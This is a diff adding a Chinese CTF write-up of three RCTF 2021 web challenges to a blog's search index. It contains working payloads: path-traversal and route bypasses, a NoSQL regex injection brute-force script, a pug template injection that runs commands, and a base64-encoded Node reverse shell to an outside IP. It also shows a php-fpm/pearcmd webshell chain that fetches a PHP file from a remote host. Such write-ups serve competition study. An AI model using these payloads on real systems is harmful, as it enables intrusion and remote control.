@@ -1482,4 +1482,80 @@
         <category>CTF比赛</category>
       </categories>
   </entry>
+  <entry>
+    <title>RCTF 2021</title>
+    <url>/2021/09/20/2021RCTF%20%E5%A4%8D%E7%8E%B0%20by%20kawhi/</url>
+    <content><![CDATA[<p>太难了，复现不来🙃<a id="more"></a></p>
+<h2 id="Easyphp"><a href="#Easyphp" class="headerlink" title="Easyphp"></a>Easyphp</h2><blockquote>
+<p>Just a common and simple php service<br><a href="http://124.71.132.232:60080/">http://124.71.132.232:60080</a></p>
+<p>题目附件： <a href="https://adworld.xctf.org.cn/media/uploads/task/c5c06ee7394f4f21aa2d66223c7d8859.zip">点击下载附件 1</a></p>
+</blockquote>
+<p>本题是一个<code>Flight</code>框架，官方地址：<code>https://github.com/mikecao/flight</code></p>
+<blockquote>
+<p>Flight is a fast，simple，extensible framework for PHP Flight enables you to quickly and easily build RESTful web applications</p>
+</blockquote>
+<p>先看到<code>index.php</code></p>
+<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20210918222045955.png" alt="image-20210918222045955"></p>
+<p>我们跟进发现有个<code>file_get_contents</code>可以任意文件读取</p>
+<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20210918224014766.png" alt="image-20210918224014766"></p>
+<p>直接访问<code>/admin</code>显示<code>Forbidden</code></p>
+<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20210915164720984.png" alt="image-20210915164720984"></p>
+<p>原因是<code>nginx</code>这里限制<code>/admin</code>只能本地访问</p>
+<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20210915092207995.png" alt="image-20210915092207995"></p>
+<p>这里看到<code>Router.php</code>会对传进来的参数进行一次<code>urldecode</code></p>
+<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20210915091846419.png" alt="image-20210915091846419"></p>
+<p>所以这里我们可以利用<code>/ad%256din</code>绕过，因为路由是按顺序执行的</p>
+<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20210915202343936.png" alt="image-20210915202343936"></p>
+<p>这里我们需要绕过<code>stristr($request-&gt;url,&quot;login&quot;)</code></p>
+<p>可以用<code>/ad%256din%253flogin</code>绕过</p>
+<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20210915202800480.png" alt="image-20210915202800480"></p>
+<p>并且有个<code>isdanger</code>函数把<code>../</code>过滤了</p>
+<p>我们可以看到<code>data</code>是从<code>/admin</code>路由的<code>&quot;./&quot;.$request-&gt;query-&gt;data</code>传进去的，这里直接双<code>url</code>编码绕</p>
+<p><code>payload</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;ad%256din%253flogin%3fdata&#x3D;..%252f..%252f..%252fflag</span><br></pre></td></tr></table></figure>
+
+<h3 id="Nu1L队解法"><a href="#Nu1L队解法" class="headerlink" title="Nu1L队解法"></a>Nu1L队解法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;login&#x2F;..;&#x2F;admin%3flogin&#x3D;aa&amp;data&#x3D;..%252f..%252f..%252fflag</span><br></pre></td></tr></table></figure>
+
+<h2 id="CandyShop"><a href="#CandyShop" class="headerlink" title="CandyShop"></a>CandyShop</h2><blockquote>
+<p>Buy some sweet candies online?<br>环境每10分钟重启一次/The container will be restarted every 10 minutes<br><a href="http://123.60.21.23:23333/">http://123.60.21.23:23333</a></p>
+<p>题目附件： <a href="https://adworld.xctf.org.cn/media/uploads/task/dda6eaf3c5ad4091b174623e32a927f7.zip">点击下载附件 1</a></p>
+</blockquote>
+<p>看源码这里发现新注册的账号没有激活</p>
+<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20210918233201255.png" alt="image-20210918233201255"></p>
+<p>但是这里有个<code>rabbit</code>账号是激活的，但是没有密码</p>
+<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20210918233315569.png" alt="image-20210918233315569"></p>
+<p>首先这里存在<code>nosql</code>注入</p>
+<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20210915210658773.png" alt="image-20210915210658773"></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Create Time: 2021/9/11 12:58</span></span><br><span class="line"><span class="string">Author: JrXnm</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">url = <span class="string">&quot;http://123.60.21.23:23333/user/login&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> string.hexdigits:</span><br><span class="line"></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: <span class="string">&quot;rabbit&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password[$regex]&quot;</span>: <span class="string">&quot;^&quot;</span> + flag + i</span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url, data=data)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&quot;You Bad Bad&quot;</span> <span class="keyword">in</span> res.text):</span><br><span class="line">            flag += i</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p>这里看到<code>shop</code>处可以渲染<code>pug</code>模板</p>
+<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20210915220807460.png" alt="image-20210915220807460"></p>
+<p>看到这里在模板渲染前的文本替换</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">let tpl &#x3D; result</span><br><span class="line">                .toString()</span><br><span class="line">                .replace(&#39;USERNAME&#39;, username)</span><br><span class="line">                .replace(&#39;CANDYNAME&#39;, candyname)</span><br><span class="line">                .replace(&#39;ADDRESS&#39;, address)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20210918235926239.png" alt="image-20210918235926239"></p>
+<p>这里我们可以用引号和等于号闭合一下前后即可</p>
+<p><code>payload</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username&#x3D;1&amp;candyname&#x3D;1&amp;address&#x3D;&#39;+a&#x3D;global.process.mainModule.constructor._load(&#39;child_process&#39;).</span><br><span class="line">execSync(&quot;cat+&#x2F;flag&quot;).toString()+b&#x3D;&#39;</span><br></pre></td></tr></table></figure>
+
+<p>或者反弹<code>shell</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username&#x3D;rabbit&amp;candyname&#x3D;bunny_candy&amp;address&#x3D;&#39;+a&#x3D;function()&#123;eval(atob(&quot;dmFyIG5ldD1wcm9jZXNzLm1haW5Nb2R1bGUucmVxdWlyZSgibmV0Iik7CnZhciBjcD1wcm9jZXNzLm1haW5Nb2R1bGUucmVxdWlyZSgiY2hpbGRfcHJvY2VzcyIpOwp2YXIgc2g9Y3Auc3Bhd24oIi9iaW4vc2giLFtdKTsKdmFyIGNsaWVudD1uZXcgbmV0LlNvY2tldCgpOwpjbGllbnQuY29ubmVjdCgxMjM0LCIxMzQuMTc1LjE2OC4yMTMiLCgpPT57Y2xpZW50LnBpcGUoc2guc3RkaW4pO3NoLnN0ZG91dC5waXBlKGNsaWVudCk7c2guc3RkZXJyLnBpcGUoY2xpZW50KTt9KTs&#x3D;&quot;));&#125;()+b&#x3D;&#39;</span><br></pre></td></tr></table></figure>
+
+<h2 id="VerySafe"><a href="#VerySafe" class="headerlink" title="VerySafe"></a>VerySafe</h2><blockquote>
+<p>I think it’s very safe<br><a href="http://123.60.21.23:54120/">http://123.60.21.23:54120</a></p>
+<p>题目附件： <a href="https://adworld.xctf.org.cn/media/uploads/task/3e27bf526b33409a8a64984a7a42783c.zip">点击下载附件 1</a></p>
+</blockquote>
+<p>首先题目的<code>docker-compose.yml</code>给了<code>image: caddy:2.4.2</code>，在<code>Caddy &lt;= 2.4.2</code> 在传递<code>script_path</code>给<code>php-fpm</code>的时候可以目录穿越，同时<code>register_argc_argv</code> 是默认开启的，而且也默认包含<code>peclcmd.php</code>，因为<code>security.limit_extensions</code>的限制，只允许后缀为<code>.php</code>的文件执行</p>
+<h3 id="官方解法"><a href="#官方解法" class="headerlink" title="官方解法"></a>官方解法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;..&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;peclcmd.php?+config-create+&#x2F;tmp&#x2F;&lt;?&#x3D;eval($_POST[1]);?&gt;&#x2F;*+&#x2F;srv&#x2F;qqqq.php</span><br><span class="line"></span><br><span class="line">POST &#x2F;..&#x2F;tmp&#x2F;qqqq.php</span><br><span class="line">1&#x3D;system(&#39;&#x2F;readflag&#39;);</span><br></pre></td></tr></table></figure>
+
+<h3 id="星盟队解法"><a href="#星盟队解法" class="headerlink" title="星盟队解法"></a>星盟队解法</h3><p>下载下来然后执行<code>shell</code>即可</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;..&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd.php?pearcmd.php+install+--installroot+&#x2F;tmp&#x2F;+http:&#x2F;&#x2F;134.175.168.213&#x2F;1.php</span><br><span class="line"></span><br><span class="line">&#x2F;..&#x2F;tmp&#x2F;tmp&#x2F;pear&#x2F;download&#x2F;1.php?1&#x3D;system(&#39;&#x2F;readflag&#39;);</span><br></pre></td></tr></table></figure>
+
+
+
+]]></content>
+      <categories>
+        <category>CTF比赛</category>
+      </categories>
+  </entry>
 </search>
